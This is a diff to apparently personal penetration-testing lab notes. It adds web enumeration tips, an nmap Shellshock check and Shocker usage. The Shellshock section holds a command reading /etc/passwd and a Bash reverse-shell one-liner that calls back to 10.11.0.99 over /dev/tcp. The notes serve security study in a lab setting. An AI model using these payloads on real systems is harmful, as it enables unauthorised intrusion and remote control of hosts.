@@ -334,7 +334,7 @@ Ftp-server but it uses UDP
 ## Port 80/443 - HTTP/HTTPS
 
 ### Web App Methodology
-* niktto
+* nikto
 	```
 	nikto -h url -o niktodp80.txt
 	```
@@ -354,13 +354,19 @@ Ftp-server but it uses UDP
 	```
 	* -N: ignore response code
 	* -r: don't search recursively
-* Check github for CMS etc. 
+* Check github for CMS, etc. 
+	* Example: See that the page is running Big Tree CMS --> google Big Tree CMS github
+	* Look for directories or pages with information e.g. README.md 
 * Look for hidden directories with cewl and guessing words on the website
 	* e.g. ask jeeves --> /jeeves or /askjeeves
 * Look at robots.txt
 * Look for readme.txt
 * Look at source code for comments on what service is running or sensitive information
+	```
+	curl 10.11.1.# -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+	```
 * Google the page 
+* Click on all links, including social media links
 * Login Console
 	* Google it 
 		*site:ovidentia.org "admin" + "password"
@@ -412,6 +418,10 @@ use auxiliary/scanner/ssl/openssl_heartbleed
 ```
 
 ### Shellshock 
+* check with nmap
+```
+nmap 10.11.1.71 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
+```
 * [Shocker](https://github.com/nccgroup/shocker)
 ```
 python shocker.py -H 10.11.1.# --cgi /cgi-bin/admin.cgi 
@@ -420,7 +430,21 @@ python shocker.py -H 10.11.1.# --cgi /cgi-bin/admin.cgi
 /bin/cat /etc/passwd
 
 //sometimes quitting and rerunning the command works
+
+//if path is not set 
+/bin/bash -c 'echo aaa; whoami; echo zzz'
+
 ```
+* Need to get a reverse shell
+	* Metasploit 
+	```
+	shell
+	```
+	* Manual
+		* [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+	```
+	/bin/bash -c 'echo aaa; bash -i >& /dev/tcp/10.11.0.99/443 0>&1; echo ccc'
+	```
 
 [Back](#summary)
 
